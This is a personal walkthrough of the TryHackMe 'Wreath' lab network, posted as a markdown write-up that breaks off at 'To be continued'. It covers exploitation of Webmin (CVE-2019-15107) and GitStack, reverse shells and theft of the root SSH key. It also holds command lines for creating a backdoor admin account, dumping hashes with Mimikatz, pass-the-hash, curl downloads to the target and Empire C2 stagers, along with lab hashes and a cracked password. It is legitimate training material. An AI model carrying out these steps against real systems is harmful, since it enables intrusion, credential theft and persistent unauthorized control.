  ## Wreath

## Enumeration

- Nmap scanned performed on network IP given.
    - How many of the first 15000 ports are open on the target? 
      ```bash
          4
      ```
    - What OS does Nmap think is running?
      ```bash
          CentOS
      ```
      
<img width="1119" height="493" alt="image" src="https://github.com/user-attachments/assets/29eacdef-031c-4756-b9cf-e3c84b54fdd1" />
<img width="311" height="158" alt="image" src="https://github.com/user-attachments/assets/b9091240-ec2d-436d-b8aa-01cb5811d128" />
  
  - Okay, we know what we're dealing with.

      - Open the IP in your browser -- what site does the server try to redirect you to?
          -   https[://]thomaswreath.thm/
            
        <img width="501" height="71" alt="image" src="https://github.com/user-attachments/assets/707819a1-9f65-46cc-b5bd-ca37d8c6f8ae" />

        Add it to your hosts file manually. This can be accomplished by editing the /etc/hosts file on Linux/MacOS,
        or C:\Windows\System32\drivers\etc\hosts on Windows, to include the IP address, followed by a tab, then the domain name. Note: this must be done as root/Administrator.
        
<img width="314" height="25" alt="image" src="https://github.com/user-attachments/assets/b022bf7c-ce5e-4f0a-8bf7-2e0fb212eff0" />


  - Reload the webpage -- it should now resolve, but it will give you a different error related to the TLS certificate. This occurs because the box is not really connected to the internet and so cannot have a signed TLS certificate. In this instance it is safe to click "Advanced" -> "Accept Risk"; however, you should never do this in the real world.

In real life we would perform a "footprinting" phase of the engagement at this point. This essentially involves finding as much public information about the target as possible and noting it down. You never know what could prove useful!

# Read through the text on the page. What is Thomas' mobile phone number?
        -  +447821548812 
Let's have a look at the highest open port.

Look back at your service scan results: what server version does Nmap detect as running here?

# If we go back and look at the highest port of 10000, I didn't pick up the service the first time, so I went back and ran it to find:
          MiniServ 1.890 (Webmin httpd)
<img width="783" height="205" alt="image" src="https://github.com/user-attachments/assets/4f88c1d2-b08e-4a6d-9336-ba22bf12d6d1" />

Put your answer to the last question into Google.

It appears that this service is vulnerable to an unauthenticated remote code execution exploit!

# What is the CVE number for this exploit?
    CVE-2019-15107

<img width="650" height="269" alt="image" src="https://github.com/user-attachments/assets/efaf3673-8ce7-418f-a780-5cef92c1c215" />


# Enumeration Complete
  - We have everything we need to break into this machine, so let's get going!

## Exploitation 
  - Start by cloning the repository. This can be done with the following command:
        - git clone https://github.com/MuirlandOracle/CVE-2019-15107
  -This creates a local copy of the exploit on our attacking machine.
  Navigate into the folder then install the required Python libraries:
        - cd CVE-2019-15107 && pip3 install -r requirements.txt

<img width="647" height="391" alt="image" src="https://github.com/user-attachments/assets/ed2cb3bb-5dba-4860-bd30-67ad570f335b" />

# Which user was the server running as?
    root
# Get a reverse shell from the target. You can either do this manually, or by typing shell into the pseudoshell and following the instructions given.


<img width="800" height="202" alt="image" src="https://github.com/user-attachments/assets/b826e1a7-d558-4190-9a81-aa105bb07251" />

- What is the root user's password hash?
      - $6$i9vT8tk3SoXXxK2P$HDIAwho9FOdd4QCecIJKwAwwh8Hwl.BdsbMOUAd3X/chSCvrmpfy.5lrLgnRVNq6/6g0PxK9VqSdy47/qKXad1


<img width="1111" height="53" alt="image" src="https://github.com/user-attachments/assets/1d33f68e-367a-4b8f-980c-fd3efb559e7e" />

# You won't be able to crack the root password hash, but you might be able to find a certain file that will give you consistent access to the root user account through one of the other services on the box.

   # What is the full path to this file?
       /root/.ssh/id_rsa
         
<img width="664" height="284" alt="image" src="https://github.com/user-attachments/assets/deaabf28-23ff-460d-a680-15e95ee75589" />
<img width="385" height="334" alt="image" src="https://github.com/user-attachments/assets/b563f43f-4411-4162-bd5d-5eca7559093f" />

   Download the key (copying and pasting it to a file on your own Attacking Machine works), then use the command chmod 600 KEY_NAME (substituting in the name of the key) to obtain persistent access to the box.

   We have everything we need for now. Let's move on to the next section: Pivoting!

<img width="1076" height="919" alt="image" src="https://github.com/user-attachments/assets/a03cf936-d639-4454-91a7-a31ac40b5de4" />

  # How could you see which IP addresses are active and allow ICMP echo requests on the 172.16.0.x/24 network using Bash?
       for i in {1..255}; do (ping -c 1 172.16.0.${i} | grep "bytes from" &); done


  # On Kali (inside the directory containing your Nmap binary):
        sudo python3 -m http.server 80
        
<img width="517" height="178" alt="image" src="https://github.com/user-attachments/assets/1ded717e-d2aa-44cc-a045-dac33aa03cb3" />


# Then, on the target:    
    curl 10.250.180.4/nmap-abpollard -o /tmp/nmap-abpollard && chmod +x /tmp/nmap-abpollard

<img width="820" height="187" alt="image" src="https://github.com/user-attachments/assets/3664e48a-684c-4f7e-bddc-af62400d758f" />
<img width="807" height="82" alt="image" src="https://github.com/user-attachments/assets/da7ae061-b23c-47c9-b847-c968993b3181" />

# Excluding the out of scope hosts, and the current host (.200), how many hosts were discovered active on the network?
      2

# In ascending order, what are the last octets of these host IPv4 addresses? (e.g. if the address was 172.16.0.80, submit the 80)
      100,150

<img width="725" height="316" alt="image" src="https://github.com/user-attachments/assets/78482669-0c46-43ca-8645-cf5a46c8ed1c" />

# Scan the hosts -- which one does not return a status of "filtered" for every port (submit the last octet only)?
    150 

<img width="787" height="284" alt="image" src="https://github.com/user-attachments/assets/93d8be36-fd9c-46e4-8e13-c2b440b975d8" />


# Which TCP ports (in ascending order, comma separated) below port 15000, are open on the remaining target?
    80, 3389, 5985
# Assuming that the service guesses made by Nmap are accurate, which of the found services is more likely to contain an exploitable vulnerability? 
    http



- As a word of advice: sshuttle is highly recommended for creating an initial access point into the rest of the network. This is because the firewall on the CentOS target will prove problematic with some of the techniques shown here. We will learn how to mitigate against this later in the room, although if you're comfortable opening up a port using firewalld then port forwarding or a proxy would also work.

  sshuttle -r root@10.200.180.200 --ssh-cmd "ssh -i wreath_key.txt" 10.200.180.200/24 -x 10.200.180.200

# What is the name of the program running the service?
      gitstack

- Head to the login screen of this application. This can be done by adding the answer to the previous question on at the end of the url, e.g. if using sshuttle:
http://IP/ANSWER

When navigating to this URI, we are given the following login page:
<img width="357" height="221" alt="image" src="https://github.com/user-attachments/assets/d7872916-96f3-44e9-9490-27b604109c97" />

- Do these default credentials work (Aye/Nay)?
    - Nay

-There is one Python RCE exploit for version 2.3.10 of the service. What is the EDB ID number of this exploit?
      - 43777.py

   <img width="1134" height="181" alt="image" src="https://github.com/user-attachments/assets/d5153899-884c-4bbd-8ebe-a201aba77255" />



## Code Review

- Make a copy of this exploit in your local directory using the command:
searchsploit -m EDBID

<img width="561" height="260" alt="image" src="https://github.com/user-attachments/assets/2e45538d-681e-4ecc-a90d-401732310303" />


 - Look at the information at the top of the script. On what date was this exploit written?
       - 18.01.2018
<img width="673" height="98" alt="image" src="https://github.com/user-attachments/assets/f5b9f49f-3f16-41a3-af8d-de8cf1190f0e" />


Before we can do anything else, we need to determine whether this exploit was written in Python2 or Python3. A quick way of doing this is to look for the print statements (used to echo output to the console).  If there are no round brackets (e.g. print "Hello World!") then the exploit will be Python2, otherwise the exploit is likely to be Python3 (e.g. print("Hello World!")). Of course, this is far from the only way to check, but it will work for our purposes.
- Bearing this in mind, is the script written in Python2 or Python3?
      - python2 
      
<img width="337" height="88" alt="image" src="https://github.com/user-attachments/assets/0c139f6d-6ff0-484f-a123-19105b074043" />

# Exploitation

 It is now time to run the exploit!
<img width="1193" height="244" alt="image" src="https://github.com/user-attachments/assets/04c59eb7-16a8-4fc6-b137-20bb58146aa5" />
 Not only did the exploit work perfectly, it gave us command execution as NT AUTHORITY\SYSTEM, the highest ranking local account on a Windows target.

- First up, let's use some basic enumeration to get to grips with the webshell:

  - What is the hostname for this target?
       - git-serv
    
 <img width="724" height="89" alt="image" src="https://github.com/user-attachments/assets/ae58ecdd-ebf0-4f02-9a87-48f8888cce12" />

  - What operating system is this target?
       - windows
   
  <img width="757" height="206" alt="image" src="https://github.com/user-attachments/assets/9518fcd3-62d0-4f0e-8928-a827c8f83046" />

  - What user is the server running as?
       -  nt authority\system
         
<img width="669" height="82" alt="image" src="https://github.com/user-attachments/assets/5e2a60c0-4c0e-4e3d-b248-176ac19c379a" />


- To start up a TCPDump listener we would use the following command:
tcpdump -i tun0 icmp

Note: if your VPN is not using the tun0 interface then you will need to replace this with the correct interface for your system which can be found using ip -a link to see the available interfaces.

Now, using the webshell, execute the following ping command (substituting in your own VPN IP!):
ping -n 3 ATTACKING_IP

This will send three ICMP ping packets back to you.

- How many make it to the waiting listener?
      0


# Using socat

- We setup a socat on target and attacking machine
  
<img width="540" height="83" alt="image" src="https://github.com/user-attachments/assets/d5558bdf-aa6a-4b2d-a5f0-9060533e78ab" />
<img width="681" height="91" alt="image" src="https://github.com/user-attachments/assets/fba0960e-be07-4029-8332-aa4718ebea05" />
<img width="1255" height="137" alt="image" src="https://github.com/user-attachments/assets/2411ff5a-721f-4682-a31e-15d8074ec7ba" />

<img width="734" height="176" alt="image" src="https://github.com/user-attachments/assets/64eb4a15-db7a-45bd-9f18-5074dcc5adca" />

# Creating user

In the last task we got remote command execution running with the highest permissions possible on a local Windows machine, which means that we do not need to escalate privileges on this target.

In the upcoming tasks we will be looking at the second teaching point of this network -- the command and control framework: Empire. Before we do that though, let's consolidate our position a little.

From the enumeration we did on this target we know that ports 3389 and 5985 are open. This means that (using an account with the correct privileges) we should be able to obtain either a GUI through RDP (port 3389) or a stable CLI shell using WinRM (port 5985).

Specifically, we need a user account (as opposed to the service account which we're currently using), with the "Remote Desktop Users" group for RDP, or the "Remote Management Users" group for WinRM. A user in the "Administrators" group trumps the RDP group, and the original Administrator account can access either at will.

We already have the ultimate access, so let's create such an account! Choose a unique username here (your TryHackMe username would do), and obviously pick a password which you don't use anywhere else.

First we create the account itself:
net user USERNAME PASSWORD /add

<img width="438" height="103" alt="image" src="https://github.com/user-attachments/assets/612fe7c2-4db4-45ac-ae30-628956098a36" />

Next we add our newly created account in the "Administrators" and "Remote Management Users" groups:
net localgroup Administrators USERNAME /add
net localgroup "Remote Management Users" USERNAME /add

<img width="678" height="148" alt="image" src="https://github.com/user-attachments/assets/4c59d606-17b8-421b-a4e2-29fa02c1efe3" />

- We can now use this account to get stable access to the box!

Let's access the box over WinRM. For this we'll be using an awesome little tool called evil-winrm.

This does not come installed by default on Kali, so use the following command to install it from the Ruby Gem package manager:
sudo gem install evil-winrm

With evil-winrm installed, we can connect to the target with the syntax shown here:
evil-winrm -u USERNAME -p PASSWORD -i TARGET_IP


<img width="1122" height="192" alt="image" src="https://github.com/user-attachments/assets/3e2eceef-acac-40df-94e1-a473b1113806" />

Now let's look at connecting over RDP for a GUI environment.

There are many RDP clients available for Linux. One of the most versatile is "xfreerdp" -- this is what we will be using here. If not already installed, you can install xfreerdp with the command:
sudo apt install freerdp2-x11

As mentioned, xfreerdp is an incredibly versatile tool with a vast number of options available. These range from routing audio and USB connections into the target, through to pass-the-hash attacks over RDP. The most basic syntax for connecting is as follows:
xfreerdp /v:IP /u:USERNAME /p:PASSWORD

For example:
xfreerdp /v:172.16.0.5 /u:user /p:'password123!'

Note that (as this is a command line tool), passwords containing special characters must be enclosed in quotes.

When authentication has successfully taken place, a new window will open giving GUI access to the target.

<img width="1048" height="789" alt="image" src="https://github.com/user-attachments/assets/92fc4996-5cd3-4755-a4bf-77ea668c295a" />


Note that the name of the share will change according to what you selected in the /drive switch.

A useful directory to share is the /usr/share/windows-resources directory on Kali. This shares most of the Windows tools stockpiled on Kali, including Mimikatz which we will be using next. This would make the full command:
xfreerdp /v:IP /u:USERNAME /p:PASSWORD +clipboard /dynamic-resolution /drive:/usr/share/windows-resources,share

With GUI access obtained and our Windows resources shared to the target, we can now very easily use Mimikatz to dump the local account password hashes for this target. Next we open up a cmd.exe or PowerShell window as an administrator (i.e. right click on the icon, then click "Run as administrator") in the GUI and enter the following command:
\\tsclient\share\mimikatz\x64\mimikatz.exe
<img width="657" height="274" alt="image" src="https://github.com/user-attachments/assets/0d57f014-94cc-4c78-adb9-4512fab0f5bc" />

With Mimikatz loaded, we next need to give ourselves the Debug privilege and elevate our integrity to SYSTEM level. This can be done with the following commands:
privilege::debug
token::elevate

<img width="967" height="299" alt="image" src="https://github.com/user-attachments/assets/1a005e7f-f0b4-4c57-86cc-2ccec3fe35bf" />

If we want we could log Mimikatz output with the log command. For example: log c:\windows\temp\mimikatz.log, would save the Mimikatz output into the Windows Temp directory. This could also be saved directly into our Kali machine, but be aware that the remote destination must be writeable to the local user running the RDP session.

We can now dump all of the SAM local password hashes using:
lsadump::sam

Near the top of the results you will see the Administrator's NTLM hash:


<img width="968" height="385" alt="image" src="https://github.com/user-attachments/assets/af41039e-e4f7-4ad1-b980-9a6b4f14c9cd" />

- What is the Administrator password hash?
        - 37db630168e5f82aafa8461e05c6bbd1

- What is the NTLM password hash for the user "Thomas"?
        - 02d90eda8f6b6b06c32d5f207831101f

You won't be able to crack the Administratrator hash, but let's try cracking Thomas' password hash. Tools such as Hashcat or John the Ripper are versatile and good for most password cracking situations; however, the unsalted NTLM password hash we have in our possession can be cracked using a much simpler method.

Sites such as Crackstation perform password lookups. In other words, they store a huge database of password/hash combinations, meaning that they can take a hash and instantly look up the already cracked password.

Use Crackstation to break Thomas' hash!
    - i<3ruby
    
<img width="903" height="333" alt="image" src="https://github.com/user-attachments/assets/eb52b3fd-07c4-44c9-8927-4c1db04b326e" />


In the real world this would be enough to obtain stable access; however, in our current environment, the new account will be deleted if the network is reset.

For this reason you are encouraged to to use the evil-winrm built-in pass-the-hash technique using the Administrator hash we looted.

To do this we use the -H switch instead of the -p switch we used before.

For example:
evil-winrm -u Administrator -H ADMIN_HASH -i IP

<img width="1139" height="173" alt="image" src="https://github.com/user-attachments/assets/b1df3636-ffcb-4f8d-82b2-eff634ae4dc6" />

So, we have a stable shell. What now?

With a foothold in a target network, we can start looking to bring what is known as a C2 (Command and Control) Framework into play. C2 Frameworks are used to consolidate an attacker's position within a network and simplify post-exploitation steps (privesc, AV evasion, pivoting, looting, covert network tactics, etc), as well as providing red teams with extensive collaboration features. There are many C2 Frameworks available. The most famous (and expensive) is likely Cobalt Strike; however, there are many others, including the .NET based Covenant, Merlin, Shadow, PoshC2, and many others. An excellent resource for finding (and filtering) C2 frameworks is The C2 Matrix, which provides a great list of the pros and cons of a huge number of frameworks.

We have a system shell on a Windows host, making this an ideal time to introduce the second of our three teaching topics: the C2 Framework "Empire".

Powershell Empire is, as the name suggests, a framework built primarily to attack Windows targets (although especially with the advent of dotnet core, more and more of the functionality may become usable in other systems). It provides a wide range of modules to take initial access to a network of devices, and turn it into something much bigger. In this section we will be looking at the principles of PS Empire, as well as how to use it (and its GUI interface: Starkiller) to improve our shell and perform post-exploitation techniques on the Git Server.

The Empire project was originally abandoned in early 2019; however, it was soon picked up by a company called BC-Security, who have maintained and improved it ever since. As such, there are actually two public versions of Empire -- the original (now very outdated), and the current BC-Security fork. Be careful to get the right one!

Note: this material was originally written for Empire 3.x, but has been updated in response to the release of Empire 4.x which has a very different way of operating. Make sure to use Empire 4.x if following along with these materials.

We will be looking into both Empire and its GUI extension: "Starkiller". Empire is the original CLI based framework but has now been split into a server mode and a client mode. Starkiller is a more recent addition to the toolbox, and can be used instead of (or as well as) the Empire client CLI program.
    


Starkiller and Empire (via Docker) are both already installed on the TryHackMe AttackBox, so if you are not using your own machine then you can skip this task.

That said, if we are using our own VM then we need to install both Empire and Starkiller before we use them. Ultimately it's up to you which you use; both will be covered in the tasks. Regardless, we need to install at least Empire.

In ages past this was a much more complicated process involving the Git repo and setup scripts. These days it's easiest to just use the apt repositories:

sudo apt install powershell-empire starkiller

With both installed, we now need to start an Empire server. This should stay running in the background whenever we want to use either the Empire Client or Starkiller:
sudo powershell-empire server

<img width="1138" height="907" alt="image" src="https://github.com/user-attachments/assets/4937b360-61b3-4c61-9533-652f15bbdaad" />


Starkiller is an Electron app which works by connecting to the REST API exposed by the Empire server
With an Empire server running, we can start Starkiller by executing "starkiller" in a new terminal window:

<img width="939" height="643" alt="image" src="https://github.com/user-attachments/assets/5248a008-9ac2-4cc5-85dc-da50f7686ff4" />

From here we need to sign into the REST API we deployed previously. By default this runs on https://localhost:1337, with a username of empireadmin and a password of password123:


<img width="1100" height="332" alt="image" src="https://github.com/user-attachments/assets/fe89a7ca-c1c9-4c69-8bce-e1f7b6592532" />


When we first launched Starkiller, we were placed automatically in the Listeners menu:

The process of creating a listener with the GUI is very intuitive. Click the "Create " button.

In the menu that pops up, set the Type to http, the same as with the Empire Listener we created before. Several new options will appear:

<img width="702" height="328" alt="image" src="https://github.com/user-attachments/assets/6d26ba93-017b-427a-9e1e-70eab4bdf013" />


<img width="862" height="221" alt="image" src="https://github.com/user-attachments/assets/d8d48c39-c8da-4b98-b01e-58e1458cb4a1" />


Stagers are Empire's payloads. They are used to connect back to waiting listeners, creating an agent when executed.

We can generate stagers in either Empire CLI or Starkiller. In most cases these will be given as script files to be uploaded to the target and executed. Empire gives us a huge range of options for creating and obfuscating stagers for AV evasion; however, we will not be going into a lot of detail about these here.


First we switch over to the Stagers menu on the left hand side of the interface:
Showing the stagers menu on the left hand side of the Starkiller interface

From here we click "Create" and once again select multi/bash.

We select the Listener we created in the previous task, then click submit, leaving the other options at their default values:

<img width="826" height="343" alt="image" src="https://github.com/user-attachments/assets/b55a1b6c-cc35-489f-aeac-7a0fd3f8978e" />
<img width="308" height="215" alt="image" src="https://github.com/user-attachments/assets/b40f1d03-279a-4107-96b0-65ee4b1b8b9c" />

<img width="408" height="84" alt="image" src="https://github.com/user-attachments/assets/bbf10718-d0ab-41e0-8504-c560cb744050" />


To interact with agents In Starkiller we go to the Agents tab on the left hand side of the screen:


<img width="1162" height="250" alt="image" src="https://github.com/user-attachments/assets/45545a9e-49f8-4b56-a33f-82630d870f19" />

<img width="976" height="372" alt="image" src="https://github.com/user-attachments/assets/7c907eda-7fa9-456d-bcbe-53c6a34098c5" />


Create a new listener and choose "http_hop" for the type. We then fill in the options much like with the Empire CLI Client:

<img width="1063" height="201" alt="image" src="https://github.com/user-attachments/assets/8b59cd63-307f-49c2-87be-9c37b4111451" />
Now let's get that jumpserver set up!

First of all, in the /tmp directory of the compromised webserver, create and enter a directory called hop-USERNAME. e.g.:
Creating a directory called hop-USERNAME in the /tmp directory of the compromised webserver. e.g. mkdir /tmp/hop-USERNAME, cd /tmp/hop-USERNAME

Transfer the contents from the /tmp/http_hop (or whatever you called it) directory across to this directory on the target server. A good way to do this is by zipping up the contents of the directory (cd /tmp/http_hop && zip -r hop.zip *), then transferring the zipfile across using one of the methods previously shown. For example, doing this with a Python HTTP server:

<img width="2345" height="401" alt="image" src="https://github.com/user-attachments/assets/422fc38a-99b8-4484-bf3d-a6b053060092" />


As shown in the screenshot, the webserver is now listening in the background on the chosen port 47000.

<img width="792" height="400" alt="image" src="https://github.com/user-attachments/assets/f5b80c63-7e32-4615-a0e0-ffe4ef27eeda" />

- Scan the top 50 ports of the last IP address you found in Task 17. Which ports are open (lowest to highest, separated by commas)?
      80,3389
<img width="864" height="191" alt="image" src="https://github.com/user-attachments/assets/98926f21-28f9-48ce-8afd-655e52f63fea" />


We found two ports open in the previous task. RDP won't be of much use to us without credentials (or at least a hash, although Pass-the-Hash attacks are often restricted through RDP anyway); however, the webserver is worth looking into. Wreath told us that he worked on his website using a local environment on his own PC, so this bleeding-edge version may contain some vulnerabilities that we could use to exploit the target. Before we can do that, however, we must figure out how to access the development webserver on Wreath's PC from our attacking machine.

We have two immediate options for this: Chisel, and Plink.


To be continued..


















  





 










    

    







        
        

             

       






